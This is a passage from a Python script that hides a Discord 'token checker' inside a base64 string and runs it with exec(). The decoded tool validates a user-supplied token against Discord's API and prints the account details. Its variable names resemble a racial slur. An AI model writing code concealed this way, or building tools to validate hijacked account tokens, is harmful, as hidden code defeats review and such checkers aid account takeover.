Bub3QgY3JlZGl0IGl0IHRvIHlvdXJzLgojICAgICAtIE5lIHBhcyB0b3VjaGVyIG5pIG1vZGlmaWVyIGxlIGNvZGUgY2ktZGVzc291cy4gRW4gY2FzIGQnZXJyZXVyLCB2ZXVpbGxleiBjb250YWN0ZXIgbGUgcHJvcHJpw6l0YWlyZSwgbWFpcyBlbiBhdWN1biBjYXMgdm91cyBuZSBkZXZleiB0b3VjaGVyIGF1IGNvZGUuCiMgICAgIC0gTmUgcmV2ZW5kZXogcGFzIGNlIHRvb2wsIG5lIGxlIGNyw6lkaXRleiBwYXMgYXUgdsO0dHJlLgpkZWYgdG9rZW5fY2hlY2tlcigpIDoKICAgIG5lZ2VycyA9ICIiIgoK4paI4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlyAgICAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgCuKVmuKVkOKVkOKWiOKWiOKVlOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcgIOKWiOKWiOKVkSAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcKICAg4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkSAgICDilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWRICAgICDilojilojilojilojilojilZTilZ0g4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0KICAg4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIOKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKWiOKWiOKVlyDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlwogICDilojilojilZEgICDilZrilojilojilojilojilojilojilZTilZ3ilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilZrilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRCiAgIOKVmuKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnQoKCgogICIiIgogICAgbmVnZXJzID0gZmlyZSAoIG5lZ2VycyApCiAgICBwcmludCAoIG5lZ2VycyApCiAgICB0b2tlbiA9IGlucHV0ICggIlwwMzNbOTNtUGxlYXNlIGVudGVyIHRoZSB0b2tlbiB0byBjaGVjazogXDAzM1swbSIgKQogICAgY2hlY2tfdG9rZW4gKCB0b2tlbiApCgoKZGVmIGNoZWNrX3Rva2VuKHRva2VuKSA6CiAgICBoZWFkZXJzID0geydBdXRob3JpemF0aW9uJyA6IHRva2VufQogICAgdHJ5IDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCAoICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUnLCBoZWFkZXJzPWhlYWRlcnMgKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMCA6CiAgICAgICAgICAgIHByaW50ICggIlRva2VuIGlzIHZhbGlkISIgKQogICAgICAgICAgICB1c2VyX2luZm8gPSByZXNwb25zZS5qc29uICgpCiAgICAgICAgICAgIHByaW50ICggZiJVc2VyIEluZm86IHt1c2VyX2luZm99IiApCiAgICAgICAgZWxzZSA6CiAgICAgICAgICAgIHByaW50ICggIkludmFsaWQgdG9rZW4hIiApCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGUgOgogICAgICAgIHByaW50ICggZiJBbiBlcnJvciBvY2N1cnJlZDoge2V9IiApCgoKCgoKCgoKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iIDoKICAgIG1haW4gKCkKIyBDb3B5cmlnaHQgKGMpIHRvb2wgSUtPL1N3bmF4CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKIyAgICAgLSBEbyBub3QgdG91Y2ggb3IgbW9kaWZ5IHRoZSBjb2RlIGJlbG93LiBJZiB0aGVyZSBpcyBhbiBlcnJvciwgcGxlYXNlIGNvbnRhY3QgdGhlIG93bmVyLCBidXQgdW5kZXIgbm8gY2lyY3Vtc3RhbmNlcyBzaG91bGQgeW91IHRvdWNoIHRoZSBjb2RlLgojICAgICAtIERvIG5vdCByZXNlbGwgdGhpcyB0b29sLCBkbyBub3QgY3JlZGl0IGl0IHRvIHlvdXJzLgojICAgICAtIE5lIHBhcyB0b3VjaGVyIG5pIG1vZGlmaWVyIGxlIGNvZGUgY2ktZGVzc291cy4gRW4gY2FzIGQnZXJyZXVyLCB2ZXVpbGxleiBjb250YWN0ZXIgbGUgcHJvcHJpw6l0YWlyZSwgbWFpcyBlbiBhdWN1biBjYXMgdm91cyBuZSBkZXZleiB0b3VjaGVyIGF1IGNvZGUuCiMgICAgIC0gTmUgcmV2ZW5kZXogcGFzIGNlIHRvb2wsIG5lIGxlIGNyw6lkaXRleiBwYXMgYXUgdsO0dHJlLg=="""
negenege = base64.b64decode(code_base64).decode('utf-8')
exec(negenege)
